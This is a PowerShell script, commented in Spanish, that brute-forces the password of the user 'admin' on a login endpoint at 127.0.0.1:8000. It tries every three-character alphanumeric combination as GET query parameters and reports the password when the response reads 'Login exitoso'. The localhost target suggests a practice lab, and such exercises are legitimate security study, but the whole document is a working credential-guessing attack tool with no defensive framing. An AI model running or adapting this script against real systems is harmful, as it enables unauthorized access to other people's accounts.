# Configuración
$BASE_URL = "http://127.0.0.1:8000"
$user = "admin"
$caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
$total_caracteres = $caracteres.Length
$contador = 0

Write-Host "Usuario: $user"
Write-Host "URL base: $BASE_URL"
Write-Host ""

# Bucle triple para generar todas las combinaciones de 3 caracteres
for ($i = 0; $i -lt $total_caracteres; $i++) {
    for ($j = 0; $j -lt $total_caracteres; $j++) {
        for ($k = 0; $k -lt $total_caracteres; $k++) {
            # Construir la contraseña de 3 caracteres
            $password = $caracteres[$i] + $caracteres[$j] + $caracteres[$k]
            $contador++
            
            # Mostrar progreso cada 1000 intentos
            if ($contador % 1000 -eq 0) {
                Write-Host "Intentos: $contador - Probando: $password"
            }
            
            # Construir URL con parámetros (GET) - CORREGIDO
            $target_url = "$BASE_URL/login?username=$user&password=$password"
            
            try {
                # Hacer la petición GET con parámetros en la URL
                $response = Invoke-RestMethod -Uri $target_url -Method Get -TimeoutSec 5
                
                # Verificar si el login fue exitoso
                if ($response.message -eq "Login exitoso") {
                    Write-Host "`n" + "="*50 -ForegroundColor Green
                    Write-Host "¡CONTRASEÑA ENCONTRADA!" -ForegroundColor Green
                    Write-Host "Usuario: $user" -ForegroundColor White
                    Write-Host "Contraseña: $password" -ForegroundColor White -BackgroundColor DarkGreen
                    Write-Host "Intentos: $contador" -ForegroundColor White
                    Write-Host "="*50 -ForegroundColor Green
                    exit 0
                }
            }
            catch {
                # En caso de error 401 (credenciales inválidas), continuar
                if ($_.Exception.Response.StatusCode -eq 401) {
                    continue
                }
                # Para otros errores, mostrar mensaje pero continuar
                else {
                    # Solo mostrar errores no relacionados con credenciales
                    if ($_.Exception.Response.StatusCode -ne 422) {
                        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
                    }
                    continue
                }
            }
        }
    }
}

Write-Host ""
Write-Host "Contraseña no encontrada" -ForegroundColor Red
Write-Host "Intentos totales: $contador" -ForegroundColor Yellow
exit 1